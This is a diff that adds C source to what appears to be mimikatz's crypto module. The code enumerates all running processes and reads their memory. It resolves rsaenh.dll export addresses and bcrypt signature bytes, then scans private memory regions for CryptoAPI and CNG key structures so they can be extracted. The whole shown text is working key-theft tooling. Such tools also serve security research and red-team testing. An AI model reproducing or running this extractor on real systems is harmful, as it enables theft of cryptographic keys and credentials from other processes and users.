@@ -637,3 +637,254 @@ DWORD kuhl_m_crypto_extractor_GetKeySize(DWORD bits)
     v6 += 8;
   return 10 * ((v6 >> 1) + v5 + 2);
 }
+
+BOOL CALLBACK kuhl_m_crypto_extract_MemoryAnalysis(PMEMORY_BASIC_INFORMATION pMemoryBasicInformation, PVOID pvArg)
+{
+	PKIWI_CRYPT_SEARCH ps = (PKIWI_CRYPT_SEARCH) pvArg;
+	KULL_M_MEMORY_ADDRESS aLocalBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE},
+		aRemote = {pMemoryBasicInformation->BaseAddress, ps->hMemory}, aKey = aRemote;
+	PBYTE cur, limite;
+	DWORD size = 
+		#ifdef _M_X64
+		(ps->Machine == IMAGE_FILE_MACHINE_AMD64) ? FIELD_OFFSET(KIWI_CRYPTKEY64, KiwiProv) : FIELD_OFFSET(KIWI_CRYPTKEY32, KiwiProv);
+		#else
+		FIELD_OFFSET(KIWI_CRYPTKEY32, KiwiProv);
+		#endif
+	
+	if((pMemoryBasicInformation->Type == MEM_PRIVATE) && (pMemoryBasicInformation->State != MEM_FREE) && (pMemoryBasicInformation->Protect == PAGE_READWRITE))
+	{
+		if(aLocalBuffer.address = LocalAlloc(LPTR, pMemoryBasicInformation->RegionSize))
+		{
+			limite = (PBYTE) aLocalBuffer.address + pMemoryBasicInformation->RegionSize - size;
+			if(kull_m_memory_copy(&aLocalBuffer, &aRemote, pMemoryBasicInformation->RegionSize))
+			{
+				for(cur = (PBYTE) aLocalBuffer.address; cur < limite; cur += (ps->Machine == IMAGE_FILE_MACHINE_AMD64) ? sizeof(DWORD64) : sizeof(DWORD32))
+				{
+					if(
+						#ifdef _M_X64
+						RtlEqualMemory(cur, (ps->Machine == IMAGE_FILE_MACHINE_AMD64) ? (PVOID) &ps->ProcessKiwiCryptKey64 : (PVOID) &ps->ProcessKiwiCryptKey32, size)
+						#else
+						RtlEqualMemory(cur, &ps->ProcessKiwiCryptKey32, size)
+						#endif
+					)
+					{
+						if(ps->currPid != ps->prevPid)
+						{
+							ps->prevPid = ps->currPid;
+							kprintf(L"\n%wZ (%u)\n", ps->processName, ps->currPid);
+						}
+						aKey.address = cur + ((PBYTE) aRemote.address - (PBYTE) aLocalBuffer.address);
+						#ifdef _M_X64
+						if(ps->Machine == IMAGE_FILE_MACHINE_AMD64)
+							kuhl_m_crypto_extractor_capi64(&aKey);
+						else
+						#endif
+							kuhl_m_crypto_extractor_capi32(&aKey);
+					}
+				}
+			}
+			LocalFree(aLocalBuffer.address);
+		}
+	}
+	return TRUE;
+}
+
+BOOL CALLBACK kuhl_m_crypto_extract_exports_callback_module_exportedEntry32(PKULL_M_PROCESS_EXPORTED_ENTRY pExportedEntryInformations, PVOID pvArg)
+{
+	PKIWI_CRYPT_SEARCH ps = (PKIWI_CRYPT_SEARCH) pvArg;
+	if(pExportedEntryInformations->name)
+	{
+		if(_stricmp(pExportedEntryInformations->name, "CPGenKey") == 0)
+			ps->ProcessKiwiCryptKey32.CPGenKey = PtrToUlong(pExportedEntryInformations->function.address);
+		else if(_stricmp(pExportedEntryInformations->name, "CPDeriveKey") == 0)
+			ps->ProcessKiwiCryptKey32.CPDeriveKey = PtrToUlong(pExportedEntryInformations->function.address);
+		else if(_stricmp(pExportedEntryInformations->name, "CPDestroyKey") == 0)
+			ps->ProcessKiwiCryptKey32.CPDestroyKey = PtrToUlong(pExportedEntryInformations->function.address);
+		else if(_stricmp(pExportedEntryInformations->name, "CPSetKeyParam") == 0)
+			ps->ProcessKiwiCryptKey32.CPSetKeyParam = PtrToUlong(pExportedEntryInformations->function.address);
+		else if(_stricmp(pExportedEntryInformations->name, "CPGetKeyParam") == 0)
+			ps->ProcessKiwiCryptKey32.CPGetKeyParam = PtrToUlong(pExportedEntryInformations->function.address);
+		else if(_stricmp(pExportedEntryInformations->name, "CPExportKey") == 0)
+			ps->ProcessKiwiCryptKey32.CPExportKey = PtrToUlong(pExportedEntryInformations->function.address);
+		else if(_stricmp(pExportedEntryInformations->name, "CPImportKey") == 0)
+			ps->ProcessKiwiCryptKey32.CPImportKey = PtrToUlong(pExportedEntryInformations->function.address);
+		else if(_stricmp(pExportedEntryInformations->name, "CPEncrypt") == 0)
+			ps->ProcessKiwiCryptKey32.CPEncrypt = PtrToUlong(pExportedEntryInformations->function.address);
+		else if(_stricmp(pExportedEntryInformations->name, "CPDecrypt") == 0)
+			ps->ProcessKiwiCryptKey32.CPDecrypt = PtrToUlong(pExportedEntryInformations->function.address);
+		else if(_stricmp(pExportedEntryInformations->name, "CPDuplicateKey") == 0)
+			ps->ProcessKiwiCryptKey32.CPDuplicateKey = PtrToUlong(pExportedEntryInformations->function.address);
+
+		ps->bAllProcessKiwiCryptKey = ps->ProcessKiwiCryptKey32.CPGenKey && ps->ProcessKiwiCryptKey32.CPDeriveKey && ps->ProcessKiwiCryptKey32.CPDestroyKey && ps->ProcessKiwiCryptKey32.CPSetKeyParam &&
+			ps->ProcessKiwiCryptKey32.CPGetKeyParam && ps->ProcessKiwiCryptKey32.CPExportKey && ps->ProcessKiwiCryptKey32.CPImportKey && ps->ProcessKiwiCryptKey32.CPEncrypt &&
+			ps->ProcessKiwiCryptKey32.CPDecrypt && ps->ProcessKiwiCryptKey32.CPDuplicateKey;
+	}
+	return !ps->bAllProcessKiwiCryptKey;
+}
+#ifdef _M_X64
+BOOL CALLBACK kuhl_m_crypto_extract_exports_callback_module_exportedEntry64(PKULL_M_PROCESS_EXPORTED_ENTRY pExportedEntryInformations, PVOID pvArg)
+{
+	PKIWI_CRYPT_SEARCH ps = (PKIWI_CRYPT_SEARCH) pvArg;
+	if(pExportedEntryInformations->name)
+	{
+		if(_stricmp(pExportedEntryInformations->name, "CPGenKey") == 0)
+			ps->ProcessKiwiCryptKey64.CPGenKey = (DWORD64) pExportedEntryInformations->function.address;
+		else if(_stricmp(pExportedEntryInformations->name, "CPDeriveKey") == 0)
+			ps->ProcessKiwiCryptKey64.CPDeriveKey = (DWORD64) pExportedEntryInformations->function.address;
+		else if(_stricmp(pExportedEntryInformations->name, "CPDestroyKey") == 0)
+			ps->ProcessKiwiCryptKey64.CPDestroyKey = (DWORD64) pExportedEntryInformations->function.address;
+		else if(_stricmp(pExportedEntryInformations->name, "CPSetKeyParam") == 0)
+			ps->ProcessKiwiCryptKey64.CPSetKeyParam = (DWORD64) pExportedEntryInformations->function.address;
+		else if(_stricmp(pExportedEntryInformations->name, "CPGetKeyParam") == 0)
+			ps->ProcessKiwiCryptKey64.CPGetKeyParam = (DWORD64) pExportedEntryInformations->function.address;
+		else if(_stricmp(pExportedEntryInformations->name, "CPExportKey") == 0)
+			ps->ProcessKiwiCryptKey64.CPExportKey = (DWORD64) pExportedEntryInformations->function.address;
+		else if(_stricmp(pExportedEntryInformations->name, "CPImportKey") == 0)
+			ps->ProcessKiwiCryptKey64.CPImportKey = (DWORD64) pExportedEntryInformations->function.address;
+		else if(_stricmp(pExportedEntryInformations->name, "CPEncrypt") == 0)
+			ps->ProcessKiwiCryptKey64.CPEncrypt = (DWORD64) pExportedEntryInformations->function.address;
+		else if(_stricmp(pExportedEntryInformations->name, "CPDecrypt") == 0)
+			ps->ProcessKiwiCryptKey64.CPDecrypt = (DWORD64) pExportedEntryInformations->function.address;
+		else if(_stricmp(pExportedEntryInformations->name, "CPDuplicateKey") == 0)
+			ps->ProcessKiwiCryptKey64.CPDuplicateKey = (DWORD64) pExportedEntryInformations->function.address;
+
+		ps->bAllProcessKiwiCryptKey = ps->ProcessKiwiCryptKey64.CPGenKey && ps->ProcessKiwiCryptKey64.CPDeriveKey && ps->ProcessKiwiCryptKey64.CPDestroyKey && ps->ProcessKiwiCryptKey64.CPSetKeyParam &&
+			ps->ProcessKiwiCryptKey64.CPGetKeyParam && ps->ProcessKiwiCryptKey64.CPExportKey && ps->ProcessKiwiCryptKey64.CPImportKey && ps->ProcessKiwiCryptKey64.CPEncrypt &&
+			ps->ProcessKiwiCryptKey64.CPDecrypt && ps->ProcessKiwiCryptKey64.CPDuplicateKey;
+	}
+	return !ps->bAllProcessKiwiCryptKey;
+}
+#endif
+
+const BYTE Bcrypt64[] = {0x20, 0x00, 0x00, 0x00, 0x52, 0x55, 0x55, 0x55}, Bcrypt64_old[] = {0x18, 0x00, 0x00, 0x00, 0x52, 0x55, 0x55, 0x55};
+const BYTE Bcrypt32[] = {0x14, 0x00, 0x00, 0x00, 0x52, 0x55, 0x55, 0x55}, Bcrypt32_old[] = {0x10, 0x00, 0x00, 0x00, 0x52, 0x55, 0x55, 0x55};
+BOOL CALLBACK kuhl_m_crypto_extract_MemoryAnalysisBCrypt(PMEMORY_BASIC_INFORMATION pMemoryBasicInformation, PVOID pvArg)
+{
+	PKIWI_CRYPT_SEARCH ps = (PKIWI_CRYPT_SEARCH) pvArg;
+	KULL_M_MEMORY_ADDRESS aLocalBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE},
+		aRemote = {pMemoryBasicInformation->BaseAddress, ps->hMemory}, aKey = aRemote;
+	PBYTE cur, limite;
+	DWORD size = 
+		#ifdef _M_X64
+		(ps->Machine == IMAGE_FILE_MACHINE_AMD64) ? sizeof(Bcrypt64) : sizeof(Bcrypt32);
+		#else
+		sizeof(Bcrypt32);
+		#endif
+	
+	if((pMemoryBasicInformation->Type == MEM_PRIVATE) && (pMemoryBasicInformation->State != MEM_FREE) && (pMemoryBasicInformation->Protect == PAGE_READWRITE))
+	{
+		if(aLocalBuffer.address = LocalAlloc(LPTR, pMemoryBasicInformation->RegionSize))
+		{
+			limite = (PBYTE) aLocalBuffer.address + pMemoryBasicInformation->RegionSize - size;
+			if(kull_m_memory_copy(&aLocalBuffer, &aRemote, pMemoryBasicInformation->RegionSize))
+			{
+				for(cur = (PBYTE) aLocalBuffer.address; cur < limite; cur += (ps->Machine == IMAGE_FILE_MACHINE_AMD64) ? sizeof(DWORD64) : sizeof(DWORD32))
+				{
+					if(
+						#ifdef _M_X64
+						RtlEqualMemory(cur, (ps->Machine == IMAGE_FILE_MACHINE_AMD64) ?
+						((MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_7) ? Bcrypt64_old : Bcrypt64)
+						:
+						((MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_7) ? Bcrypt32_old : Bcrypt32)
+						, size)
+						#else
+						RtlEqualMemory(cur, (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_7) ? Bcrypt32_old : Bcrypt32, size) 
+						#endif
+					)
+					{
+						if(ps->currPid != ps->prevPid)
+						{
+							ps->prevPid = ps->currPid;
+							kprintf(L"\n%wZ (%u)\n", ps->processName, ps->currPid);
+						}
+						aKey.address = cur + ((PBYTE) aRemote.address - (PBYTE) aLocalBuffer.address);
+						#ifdef _M_X64
+						if(ps->Machine == IMAGE_FILE_MACHINE_AMD64)
+							kuhl_m_crypto_extractor_bcrypt64(&aKey);
+						else
+						#endif
+							kuhl_m_crypto_extractor_bcrypt32(&aKey);
+					}
+				}
+			}
+			LocalFree(aLocalBuffer.address);
+		}
+	}
+	return TRUE;
+}
+
+BOOL CALLBACK kuhl_m_crypto_extract_ProcessAnalysis(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, PVOID pvArg)
+{
+	PKIWI_CRYPT_SEARCH ps = (PKIWI_CRYPT_SEARCH) pvArg;
+	HANDLE hProcess;
+	DWORD pid = PtrToUlong(pSystemProcessInformation->UniqueProcessId);
+	PEB Peb;
+	PIMAGE_NT_HEADERS pNtHeaders;
+	KULL_M_MEMORY_ADDRESS aRemote = {NULL, NULL};
+	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION cryptInfos;
+	if((pid > 4) && (pid != ps->myPid))
+	{
+		if(hProcess = OpenProcess(GENERIC_READ, FALSE, pid))
+		{
+			if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &aRemote.hMemory))
+			{
+				ps->hMemory = aRemote.hMemory;
+				if(kull_m_process_peb(aRemote.hMemory, &Peb, FALSE))
+				{
+					aRemote.address = Peb.ImageBaseAddress;
+					if(kull_m_process_ntheaders(&aRemote, &pNtHeaders))
+					{
+						if(kull_m_process_getVeryBasicModuleInformationsForName(aRemote.hMemory, L"rsaenh.dll", &cryptInfos))
+						{
+							ps->Machine = pNtHeaders->FileHeader.Machine;
+							ps->bAllProcessKiwiCryptKey = FALSE;
+							RtlZeroMemory(&ps->ProcessKiwiCryptKey32, sizeof(KIWI_CRYPTKEY32));
+							#ifdef _M_X64
+							RtlZeroMemory(&ps->ProcessKiwiCryptKey64, sizeof(KIWI_CRYPTKEY64));
+							#endif
+							if(
+								#ifdef _M_X64
+									NT_SUCCESS(kull_m_process_getExportedEntryInformations(&cryptInfos.DllBase, (pNtHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) ? kuhl_m_crypto_extract_exports_callback_module_exportedEntry64 : kuhl_m_crypto_extract_exports_callback_module_exportedEntry32, pvArg))
+								#else
+									NT_SUCCESS(kull_m_process_getExportedEntryInformations(&cryptInfos.DllBase, kuhl_m_crypto_extract_exports_callback_module_exportedEntry32, pvArg))
+								#endif
+								&& ps->bAllProcessKiwiCryptKey)
+							{
+								ps->currPid = pid;
+								ps->processName = &pSystemProcessInformation->ImageName;
+								kull_m_process_getMemoryInformations(aRemote.hMemory, kuhl_m_crypto_extract_MemoryAnalysis, pvArg);
+							}
+						}
+
+						if(MIMIKATZ_NT_MAJOR_VERSION > 5)
+						{
+							if(kull_m_process_getVeryBasicModuleInformationsForName(aRemote.hMemory, (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"bcrypt.dll" : L"bcryptprimitives.dll", &cryptInfos))
+							{
+								ps->Machine = pNtHeaders->FileHeader.Machine;
+								ps->bAllProcessKiwiCryptKey = FALSE;
+								ps->currPid = pid;
+								ps->processName = &pSystemProcessInformation->ImageName;
+								kull_m_process_getMemoryInformations(aRemote.hMemory, kuhl_m_crypto_extract_MemoryAnalysisBCrypt, pvArg);
+							}
+						}
+						LocalFree(pNtHeaders);
+					}
+				}
+				kull_m_memory_close(aRemote.hMemory);
+			}
+			CloseHandle(hProcess);
+		}
+	}
+	return TRUE;
+}
+
+NTSTATUS kuhl_m_crypto_extract(int argc, wchar_t * argv[])
+{
+	KIWI_CRYPT_SEARCH searchData = {NULL, 0, {0}, 
+	#ifdef _M_X64
+	{0}, 
+	#endif
+	FALSE, GetCurrentProcessId(), 0, 0, NULL};
+	kull_m_process_getProcessInformation(kuhl_m_crypto_extract_ProcessAnalysis, &searchData);
+	return STATUS_SUCCESS;
+}
